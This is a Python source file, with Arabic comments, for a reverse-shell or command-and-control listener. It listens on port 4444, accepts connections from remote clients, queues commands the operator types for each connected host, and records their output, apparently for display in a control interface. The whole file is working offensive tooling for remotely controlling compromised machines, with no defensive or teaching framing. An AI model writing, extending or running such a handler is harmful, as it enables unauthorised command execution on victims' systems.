import socket
import threading
import json
import time
from datetime import datetime

class RealListener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}  
        self.commands = {}  
        self.running = False
        self.server = None
        
    def start(self):
        """بدء الـ listener الحقيقي"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.running = True
        
        print(f"[*] Real Listener started on {self.host}:{self.port}")
        
        accept_thread = threading.Thread(target=self.accept_clients, daemon=True)
        accept_thread.start()
        
        return self
    
    def accept_clients(self):
        """قبول اتصالات جديدة"""
        while self.running:
            try:
                client_socket, client_address = self.server.accept()
                client_id = f"{client_address[0]}:{client_address[1]}"
                
                print(f"[+] New connection: {client_id}")
                
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now(),
                    'last_seen': datetime.now()
                }
                
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address, client_id),
                    daemon=True
                )
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"[-] Error accepting client: {e}")
    
    def handle_client(self, client_socket, client_address, client_id):
        """التعامل مع عميل معين"""
        try:
            try:
                banner = client_socket.recv(1024).decode('utf-8', errors='ignore')
                print(f"[*] {client_id}: {banner.strip()}")
            except:
                pass
            
            while self.running and client_id in self.clients:
                if client_id in self.commands and self.commands[client_id]:
                    command = self.commands[client_id].pop(0)
                    
                    try:
                        client_socket.send(command.encode() + b"\n")
                        print(f"[>] Sent to {client_id}: {command}")
                        
                        response = b""
                        client_socket.settimeout(5)
                        
                        try:
                            while True:
                                chunk = client_socket.recv(4096)
                                if not chunk:
                                    break
                                response += chunk
                        except socket.timeout:
                            pass
                        
                        if response:
                            response_text = response.decode('utf-8', errors='ignore')
                            print(f"[<] Response from {client_id}:\n{response_text}")
                            
                            if 'last_response' not in self.clients[client_id]:
                                self.clients[client_id]['last_response'] = []
                            self.clients[client_id]['last_response'].append({
                                'command': command,
                                'response': response_text,
                                'timestamp': datetime.now().isoformat()
                            })
                            
                    except Exception as e:
                        print(f"[-] Error with {client_id}: {e}")
                
                time.sleep(0.5) 
                
        except Exception as e:
            print(f"[-] Client {client_id} error: {e}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            if client_id in self.commands:
                del self.commands[client_id]
            try:
                client_socket.close()
            except:
                pass
            print(f"[-] Client {client_id} disconnected")
    
    def send_command(self, client_id, command):
        """إرسال أمر لعميل معين (من الواجهة)"""
        if client_id not in self.clients:
            return {'success': False, 'error': 'Client not connected'}
        
        if client_id not in self.commands:
            self.commands[client_id] = []
        
        self.commands[client_id].append(command)
        return {'success': True, 'message': f'Command queued for {client_id}'}
    
    def get_clients_info(self):
        """الحصول على معلومات العملاء للعرض في الواجهة"""
        clients_info = {}
        for client_id, info in self.clients.items():
            clients_info[client_id] = {
                'ip': info['address'][0],
                'port': info['address'][1],
                'connected_at': info['connected_at'].isoformat(),
                'last_seen': info['last_seen'].isoformat(),
                'has_pending': client_id in self.commands and len(self.commands[client_id]) > 0
            }
        return clients_info
    
    def get_responses(self, client_id):
        """الحصول على الردود الأخيرة"""
        if client_id in self.clients and 'last_response' in self.clients[client_id]:
            return self.clients[client_id]['last_response']
        return []
    
    def stop(self):
        """إيقاف الـ listener"""
        self.running = False
        for client_id, info in list(self.clients.items()):
            try:
                info['socket'].close()
            except:
                pass
        if self.server:
            try:
                self.server.close()
            except:
                pass
        print("[*] Listener stopped")

real_listener = RealListener()

def get_real_listener():
    return real_listener